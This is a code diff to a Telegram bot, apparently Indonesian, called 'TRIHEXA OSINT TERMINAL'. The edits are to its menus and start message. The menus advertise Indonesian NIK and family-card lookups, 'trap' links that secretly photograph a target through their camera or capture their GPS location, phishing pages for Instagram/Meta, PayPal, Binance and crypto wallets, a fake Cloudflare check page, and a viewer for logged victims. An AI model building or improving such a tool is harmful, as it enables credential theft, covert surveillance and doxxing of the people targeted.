@@ -1685,7 +1685,7 @@ There are no background services or permissions associated.
       ['📞 Phone Tracker (HLR)', '💻 MAC Address OSINT'],
       ['🚀 Port Scanner', '🚨 CVE Exploit Lookup'],
       ['── 🛑 STEALTH TRAP LOGGER ──'],
-      ['📸 Hack Kamera Target', '📍 Hack GPS PresisiTarget'],
+      ['📸 Hack Kamera Target', '📍 Hack GPS Presisi Target'],
       ['🎣 Phishing IG/Meta', '💰 Phishing Crypto/Wallet'],
       ['🛡️ Trap Bypass Cloudflare', '🎮 Phishing Steam'],
       ['📊 Lihat Log Korban (Logger)', '⚙️ Set Custom Domain Tracker'],
@@ -1795,7 +1795,12 @@ There are no background services or permissions associated.
                 `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
 
-    bot.start((ctx) => ctx.reply(getStartMsg(), { parse_mode: 'HTML', ...mainReplyKeyboard }));
+    bot.start(async (ctx) => {
+        await ctx.reply("🔄 <b>Inisialisasi Terminal...</b>\nUpdate UI Keyboard berhasil dimuat.", { parse_mode: 'HTML', ...mainReplyKeyboard });
+        const safeName = (ctx.from?.first_name || 'User').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;');
+        const txt = `${getStartMsg()}\n<i>Session Active for: ${safeName}</i>`;
+        await ctx.reply(txt, { parse_mode: 'HTML', ...mainInlineKeyboard });
+    });
 
     bot.action('menu_main', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
@@ -4539,6 +4544,14 @@ There are no background services or permissions associated.
     // 📸 IMAGE OSINT MODULE (Reverse Image / Data)
     // 🗂️ BUTTON REPLIES MAPPING
     const buttonMap: Record<string, string> = {
+       '🔒 TRIHEXA OSINT TERMINAL 🔒': '<b>🔒 TRIHEXA OSINT TERMINAL</b>\nSistem aktif. Pilih menu pada keyboard.',
+       '── 🇮🇩 OSINT INDONESIA ──': '<b>🇮🇩 PUSAT KONTROL OSINT INDONESIA</b>\nPilih layanan pencarian data dari tombol di bawah.',
+       '── 🕵️ GLOBAL OSINT & TRACKING ──': '<b>🕵️ GLOBAL OSINT & TRACKING</b>\nPilih layanan pelacakan digital dari tombol di bawah.',
+       '── 🛑 STEALTH TRAP LOGGER ──': '<b>🛑 STEALTH TRAP LOGGER</b>\nPilih modul eksploitasi & phishing dari tombol di bawah.',
+       '── 🛠️ ADVANCED CYBER TOOLS ──': '<b>🛠️ ADVANCED CYBER TOOLS</b>\nPilih alat siber tingkat lanjut dari tombol di bawah.',
+       '── 🧩 UTILITAS & MEDIA ──': '<b>🧩 UTILITAS & MEDIA</b>\nPilih alat hiburan dan utilitas dari tombol di bawah.',
+       '── 💀 PRO FITUR ──': '<b>💀 VIP & PRO FITUR</b>\nAkses layanan khusus dan eksperimental.',
+
        '🆔 Cek NIK': '<b>🆔 CEK NIK</b>\nKetik: <code>/nik [Nomor_NIK]</code>',
        '🖨️ Cek KK': '<b>🖨️ CEK KARTU KELUARGA</b>\nKetik: <code>/kk [Nomor_KK]</code>',
        '🚗 Cek Plat Nopol': '<b>🚗 CEK PLAT KENDARAAN</b>\nKetik: <code>/plat [Nomor_Plat]</code>\nContoh: <code>/plat B1234XYZ</code>',
@@ -4572,7 +4585,7 @@ There are no background services or permissions associated.
        '🚨 CVE Exploit Lookup': '<b>🚨 CVE / RED TEAM ANALYST</b>\nKetik:\n• <code>/cve CVE-XXXX-XXXX [PAS 1928]</code>',
        
        '📸 Hack Kamera Target': '<b>📸 INJEKSI KAMERA STEALTH</b>\nBuat Link: <code>/trap_camera</code>\n<i>(Kirim link unik ke target dan sistem akan memotret diam-diam jika disetujui)</i>',
-       '📍 Hack GPS PresisiTarget': '<b>📍 INJEKSI LOKASI GPS (PRESISI TINGGI)</b>\nBuat Link: <code>/trap_gps</code>\n<i>(Sadap titik koordinat Live akurat target)</i>',
+       '📍 Hack GPS Presisi Target': '<b>📍 INJEKSI LOKASI GPS (PRESISI TINGGI)</b>\nBuat Link: <code>/trap_gps</code>\n<i>(Sadap titik koordinat Live akurat target)</i>',
        '🎣 Phishing IG/Meta': '<b>🎣 LOGIN PANEL PHISHING META</b>\nBuat Link: <code>/trap_ig</code>',
        '💰 Phishing Crypto/Wallet': '<b>💰 PHISHING WALLET WEB3 / BINANCE / PAYPAL</b>\nBuat Link: <code>/trap_paypal</code>, <code>/trap_binance</code>, <code>/trap_wallet</code>',
        '🛡️ Trap Bypass Cloudflare': '<b>🛡️ FAKE CLOUDFLARE ANTI-BOT (TRAP)</b>\nBuat Link: <code>/trap_cloudflare</code>',
@@ -4604,6 +4617,12 @@ There are no background services or permissions associated.
       if (buttonMap[text]) {
          return ctx.reply(buttonMap[text], { parse_mode: 'HTML' });
       }
+
+      // Fallback for old keyboard buttons or UI headers
+      if (typeof text === 'string' && (text.includes('──') || text.includes('OSINT') || text.includes('Cek Data') || text.includes('Tracker') || text.includes('Phishing') || text.includes('Bantuan') || text.includes('Kamera'))) {
+         return ctx.reply("🔄 <b>Sistem Diperbarui</b>\n\nMemuat ulang Terminal UI ke versi terbaru... Silakan pilih menu dari UI baru di bawah ini.", { parse_mode: 'HTML', ...mainReplyKeyboard });
+      }
+
       return next();
     });
 
